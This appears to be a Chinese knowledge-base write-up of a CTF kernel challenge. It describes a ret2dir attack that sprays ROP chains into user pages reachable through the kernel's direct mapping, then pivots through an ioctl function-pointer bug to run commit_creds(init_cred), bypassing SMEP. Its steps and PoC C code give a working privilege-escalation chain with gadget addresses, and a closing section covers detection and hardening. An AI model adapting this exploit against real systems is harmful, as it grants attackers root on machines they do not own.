---
id: binary-pwn-kernel-ret2dir-physmap-spray-rop-commit-creds
title: ret2dir + physmap spray：内核模块 ioctl 间接调用用户函数指针，借直接映射区用户页作内核 ROP 栈完成 commit_creds 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-ret2dir-physmap-spray-rop
aliases:
- ret2dir
- physmap spray
- 直接映射区 ROP
- 内核直接映射攻击
- kgadget
- pt_regs 栈迁移提权
- SMEP 绕过 ret2dir
tags:
- kernel
- pwn
- ret2dir
- physmap-spray
- direct-map
- rop
- smep-bypass
- commit-creds
- pt-regs
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:42:36+08:00'
  notes: 已读全文与 2 张图核对：5.10.112 kgadget、ioctl 0x1bf52 从 [param] 取函数指针、10000 页 mmap physmap spray、pt_regs/pop rsp 迁移、commit_creds(init_cred)+swapgs_iretq、root_shell add rsp,8 均一致；SMEP/SMAP 与 KASLR/直接映射随机化配置原文未显式给出，按 ret2dir 通用前提保留；未本机复跑。
---

## 一句话结论

当内核模块的 ioctl 从用户可写内存读取函数指针并间接调用时，不一定要把 ROP 链写进内核堆：利用内核 direct mapping area 把用户 `mmap` 页线性映射到内核空间，先用 `mmap` 喷射大量写满 ROP 链的用户页（physmap spray），再把一个猜测的直接映射地址作为内核栈，通过 `pt_regs`/`pop rsp` 迁移过去，即可在内核态执行 `commit_creds(init_cred)` 并 `swapgs; iretq` 返回用户态拿 root shell，同时绕过 SMEP。

## 原理

- **direct mapping area 是用户页的内核别名**：x86-64 Linux 把几乎全部物理内存线性映射到内核地址空间（典型基址 `0xffff888000000000`，`virtual = physical + page_offset_base`）。用户 `mmap` 得到的每一页都有对应的物理页，因此也在这片直接映射区里有一个内核虚拟地址；内核通过这个别名访问同一份数据，不受 SMAP 对“用户地址”的限制。
- **ret2dir 的核心**：不把 ROP 链写进内核栈/堆，而是把链放在用户页中，用直接映射区地址让内核 `ret` 过去执行。SMEP 只禁止内核执行 U/S 位为用户页的映射；直接映射区别名是 supervisor 页，所以链仍可执行，SMEP 被绕过。
- **physmap spray 解决地址未知**：攻击者无法搜索内核地址空间，也不知道自己那页对应的物理地址。做法是 `mmap` 大量页（原文 10000 页）并在每页写入同样的 ROP 链；物理内存被大量页占据后，随机挑一个直接映射区地址（原文 `0xffff888000000000 + 0x7000000`）就有较大概率命中某个喷射页。命中是概率性的，失败可重试。
- **漏洞原语**：`kgadget_ioctl` 在 `cmd == 114514` 时执行 `rbx = [param]`（从用户传入地址读一个 qword 作为函数指针），随后 `call __x86_indirect_thunk_rbx`；同时它把固定字符串写到当前内核栈上方页对齐地址附近，构造/覆盖了 `pt_regs` 区域。用户因此可以让内核跳到自己选的地址，且栈布局可被影响。
- **pt_regs 与栈迁移**：系统调用入口把用户寄存器保存为内核栈上的 `pt_regs`。攻击者在用户态用内联汇编设置 `r9=pop_rsp_ret`、`r8/rdx=直接映射地址`、`rsi=0x1bf52`（ioctl cmd）、`rdi=fd`、`rax=0x10`（ioctl 系统调用号）后 `syscall`；模块的间接调用命中喷射页中的滑梯 gadget，`add rsp, 0xa0; pop...; ret` 反复抬高内核栈，最终 `pop rsp` 把 `rsp` 切到直接映射区的 ROP 链。
- **提权链**：`pop rdi; init_cred; commit_creds; swapgs_restore_regs_and_return_to_usermode; ...; root_shell; user_cs; user_rflags; user_sp; user_ss`。`commit_creds(init_cred)` 直接把当前进程 cred 换成 root；`swapgs_restore_regs_and_return_to_usermode` 从伪造的 pt_regs 恢复用户上下文并 `iretq` 回用户态执行 `root_shell`。
- **栈对齐细节**：原文最终在 `root_shell` 开头加 `add rsp, 8` 修正 `system` 调用前的栈对齐，否则用户态 `system("/bin/sh")` 会段错误；这是内核 ROP 返回用户态时常见的收尾问题。

## 触发条件

- 存在可访问的内核模块/驱动，其 ioctl 或类似入口能从用户内存读取函数指针并间接调用（或存在可控制内核 `rip/rsp` 的原语）。
- 内核开启 SMEP/SMAP（ret2dir 正是为绕过它们），但未开启 `CONFIG_RANDOMIZE_MEMORY` 或直接映射基址可预测；题目通常 KASLR 关闭、符号地址固定。
- 用户可 `mmap` 大量匿名页并有足够内存/地址空间做 physmap spray。
- 已知 `commit_creds`、`init_cred`、`swapgs_restore_regs_and_return_to_usermode`、`pop rdi`、`pop rsp`、`add rsp` 等 gadget 的内核地址（无 KASLR 时从 vmlinux 直接取）。
- 能保存用户态 `cs/ss/rflags/rsp` 用于 iretq 返回。

## 利用步骤

1. `extract-vmlinux bzImage > vmlinux`，确认内核版本与符号地址；从 vmlinux 取 `commit_creds`、`init_cred`、`swapgs_restore_regs_and_return_to_usermode`、`pop_rdi_ret`、`pop_rsp_ret`、`add_rsp_0xa0_pop...ret`、`ret` 的地址。
2. 用户态保存 `user_cs/user_ss/user_rflags/user_sp`（`mov cs/ss/rsp` + `pushf; pop`），并绑定 CPU 减少迁移/调度干扰。
3. 构造每页 ROP：前段用 `add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret` 作滑梯，中段用 `ret` 滑梯，末段放 `pop rdi; init_cred; commit_creds; swapgs_restore...; dummy; dummy; root_shell; user_cs; user_rflags; user_sp; user_ss`。
4. `mmap` 10000 页（`PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS`），逐页写入同一 ROP 链；保存页指针数组避免被 munmap。
5. 用内联汇编设置寄存器：`r9=pop_rsp_ret`、`r8=try_addr`、`rdx=try_addr`、`rsi=0x1bf52`、`rdi=fd`、`rax=0x10`，执行 `syscall` 进入 ioctl；模块从 `[param]` 取到滑梯 gadget 并间接调用，链把 `rsp` 迁到 `try_addr`。
6. 若未命中或崩溃，重试/调整 `try_addr` 与喷射页数（原文注明有概率失败，多试几次）。
7. 成功时内核执行 `commit_creds(init_cred)`，`iretq` 返回用户态 `root_shell`，`system("/bin/sh")` 得到 root；`root_shell` 开头 `add rsp, 8` 修正栈对齐。

## PoC

关键骨架（地址来自原文 5.10.112 题目环境，需按目标 vmlinux 重算；未在本机复跑）：

```c
#define page_size 4096
size_t user_cs, user_ss, user_rflags, user_sp;
size_t commit_creds = 0xffffffff810c92e0;
size_t init_cred    = 0xffffffff82a6b700;
size_t pop_rdi_ret  = 0xffffffff8108c6f0;
size_t pop_rsp_ret  = 0xffffffff811483d0;
size_t swapgs_restore = 0xffffffff81c00fb0 + 27;
size_t add_rsp_0xa0  = 0xffffffff810737fe; // add rsp,0xa0; pop rbx; pop r12; pop r13; pop rbp; ret
size_t ret           = 0xffffffff8108c6f1;
u64 try_addr = 0xffff888000000000 + 0x7000000;

void copy(u64 *rop) {
    int idx = 0;
    for (; idx < page_size/8 - 0x30; idx++) rop[idx] = add_rsp_0xa0;
    for (; idx < page_size/8 - 0x10; idx++) rop[idx] = ret;
    rop[idx++] = pop_rdi_ret;
    rop[idx++] = init_cred;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs_restore;
    rop[idx++] = 0xdeadbeef; rop[idx++] = 0xdeadbeef;
    rop[idx++] = (size_t)root_shell;
    rop[idx++] = user_cs; rop[idx++] = user_rflags;
    rop[idx++] = user_sp; rop[idx++] = user_ss;
}

void vuln(void) {
    __asm__(
        "mov r15, 0xdeadbeef; mov r14, 0xdeadbeef; mov r13, 0xdeadbeef;"
        "mov r12, 0xdeadbeef; mov rbp, 0xdeadbeef; mov rbx, 0xdeadbeef;"
        "mov r11, 0xdeadbeef; mov r10, 0xdeadbeef;"
        "mov r9, pop_rsp_ret;"
        "mov r8, try_addr;"
        "mov rax, 0x10;"
        "mov rcx, 0xdeadbeef;"
        "mov rdx, try_addr;"
        "mov rsi, 0x1bf52;"
        "mov rdi, fd;"
        "syscall"
    );
}

int main(void) {
    bind_cpu(0); save();
    fd = open("/dev/kgadget", 2);
    void **pages = malloc(10000 * sizeof(void*));
    for (int i = 0; i < 10000; i++) {
        pages[i] = mmap(NULL, page_size, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        copy((u64*)pages[i]);
    }
    vuln();
}
```

```c
void root_shell(void) {
    __asm__("add rsp, 8");   // 修正 system 前栈对齐
    system("/bin/sh");
    exit(0);
}
```

## 变体与关联

- 变体：若直接映射基址被 `CONFIG_RANDOMIZE_MEMORY` 随机化，可先通过信息泄露（dmesg、`/proc/kallsyms`、模块 sections、侧信道）获取 `page_offset_base` 再喷射。
- 变体：不依赖 ioctl 函数指针，任何能把内核 `rip/rsp` 指向攻击者可控数据的内核漏洞都可接 ret2dir；也可把链放在 `mmap` 的文件页/共享页上。
- 变体：提权目标可换成 `prepare_kernel_cred(0)+commit_creds`、改写 `modprobe_path`、`core_pattern` 或 `task_struct->cred`。
- 关联：[[binary-pwn-kernel-module-ioctl-user-function-pointer-call]]（同类 ioctl 用户函数指针，但用固定模块函数提权）、[[binary-pwn-kernel-rwx-vmalloc-user-shellcode-exec]]（不靠直接映射，直接执行内核 RWX 页）、[[binary-pwn-kernel-buddy-page-spray-packet-tx-ring]]（页级喷射的另一种实现）、[[binary-pwn-kernel-egg-hunter-physical-memory-scan]]（物理内存扫描）。

## 检测与防御

- **内核加固**：开启 KASLR + `CONFIG_RANDOMIZE_MEMORY`（随机化直接映射基址），使 physmap spray 的猜测地址失效；启用 SMEP/SMAP、`CONFIG_STRICT_KERNEL_RWX`、CFI。
- **模块审计**：禁止从用户内存读取函数指针并间接调用；ioctl 只调用模块内固定函数表，参数做范围/类型校验。
- **符号隐藏**：限制 `/proc/kallsyms`、`/sys/module/*/sections`、dmesg 访问，避免内核符号地址泄露。
- **检测**：进程大量匿名 `mmap` 并写入相同 ROP 模式、ioctl 参数指向内核直接映射区、内核 `RIP` 落在 `0xffff888...` 直接映射区、`commit_creds` 被非内核正常路径调用。
